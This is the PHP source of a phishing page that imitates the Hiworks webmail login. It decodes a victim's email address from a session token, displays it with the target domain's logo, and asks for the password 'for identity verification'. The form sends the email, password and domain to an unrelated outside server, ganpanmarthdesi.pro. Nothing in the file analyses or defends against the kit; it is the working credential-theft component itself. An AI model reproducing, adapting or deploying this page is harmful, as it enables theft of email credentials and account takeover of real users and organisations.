<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?><html lang="ko">

<head>
  <meta http-equiv="Content-Language" content="en-us">
  <meta charset="UTF-8" />
  <link rel="icon" href="https://login.office.hiworks.com/favicon-96x96.png" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>&#54616;&#51060;&#50893;&#49828; &#47196;&#44536;&#51064;</title>
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #676767;
  font-weight: 700;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  .button1 {
  background-color: white; /* Green */
  color: #404040;
  border: 1px solid #d6d6d6;
  height: 34px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  border-radius: 50px;
  cursor: none;
  background-image: url(img/img.png);
  background-repeat: no-repeat;
  padding: 0px 20px 3px 45px;
 }
 button.customBtn {
  height: 40px;
  width: 200px;
  border: none;
  background-color: white; 
  background-repeat: no-repeat;
  background-image: url("https://office.hiworks.com/<?php echo $ddomain;?>/common/logo/login");
  background-size: 200px 40px;
 }
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 40px;
  width: 400px;
  padding: 8 15px;
  margin: 0;
  background: white;
  border: 1px solid #d6d6d6;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  font-size: 15px;
  line-height: 1.42857143;
  vertical-align: top;
  color: #404040;
  background-color: white;
  background-image: url("img/key.png");
  background-position: 1px 2px; 
  background-repeat: no-repeat;
  padding: 10px 35px;
  }
  input[type=password]:focus {
  outline: none;
  border: 1px solid #2985db;
  }
  p{
  font-size: 14px;
  text-align: center;
  }
  h1{
  font-weight: 700;
  font-size: 24px;
  text-align: center;
  }
</style>
<body>

<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td>
		<div align="center">
			<table border="0" width="100" cellspacing="0" cellpadding="0">
				<tr>
					<td>
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
				  <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
					<tr>
						<td height="110"></td>
					</tr>
					<tr>
						<td height="40">
						<p align="center">
						<img src="https://logo.clearbit.com/<?php echo $ddomain;?>" width="200" height="40">
                        </td>
					</tr>
					<tr>
						<td height="70"></td>
					</tr>
					<tr>
						<td height="26">
						<h1><font color="#000000" face="Arial">Sign in to</font> <font color="#7A7A7A"><?php echo $ddomain;?></font></h1></td>
					</tr>
					<tr>
						<td height="4"></td>
					</tr>
					
					<tr>
						<td height="14">
						<p>Please enter your password for identity verification.</p></td>
					</tr>
					<tr>
						<td height="20"></td>
					</tr>
					<tr>
						<td height="38">
						<p align="center">
						   <button class="button1"><?php echo $users;?>@<?php echo $ddomain;?></button>
						   <input type="hidden" name="user" autocomplete="username" readonly="" value="<?php echo $users;?>@<?php echo $ddomain;?>">
						   <input type="hidden" name="sender" value="Hiworks.com">
						   <input type="hidden" name="domain" value="<?php echo $ddomain;?>">
						   <input type="hidden" name="link" value="https://office.hiworks.com/<?php echo $ddomain;?>/mail/webmail/m_list/b0">
						   </td>
					</tr>
					<tr>
						<td height="24"></td>
					</tr>
					<tr>
						<td width="400" height="40">
						   <input type="password" required placeholder="Password" name="passwd" autofocus >
						</td>
					</tr>
					<tr>
						<td height="20"></td>
					</tr>
					<tr>
						<td>
						<input type="image" src="img/signin-btn.png" width="400" height="44" name="I1"></td>
					</tr>
					<tr>
						<td height="15"></td>
					</tr>
					<tr>
						<td height="15">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
					<tr>
						<td height="122" background="img/footer.png">
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td height="36">
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td width="8"></td>
										<td width="133">
										<p align="left">
										<a href="another_user.php?login=<?php echo $users;?>@<?php echo $ddomain;?>" style="text-decoration: none; color: black; " >
										<font color="#2985db" size="2" face="Arial Unicode MS">
										Sign in with another ID</font></a></td>
										<td height="20"></td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="86"></td>
							</tr>
						</table>
						</td>
					</tr>
					<tr>
						<td height="2"></td>
					</tr>
					</table>
						</td>
					</tr>
					</form>
				</table>
					</td>
				</tr>
			</table>
		</div>
		</td>
	</tr>
	
	<tr>
		<td>
		
		</td>
	</tr>
		
</table>

</body>

</html>